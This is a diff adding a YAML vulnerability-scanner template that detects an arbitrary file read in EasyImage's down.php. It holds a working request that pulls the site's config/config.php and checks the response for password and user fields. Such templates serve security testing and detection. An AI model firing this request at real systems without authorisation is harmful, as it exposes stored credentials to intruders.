@@ -1,0 +1,23 @@
+id: easyimage-down-any-fileread
+info:
+  name: EasyImage down.php Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: fileread,easyimage
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/application/down.php?dw=./config/config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "'password'=>'"
+          - "'user'=>'"
+          - "'imgurl'=>'"
+          - "'waterText'=>'"
+          - "'domain'=>'"
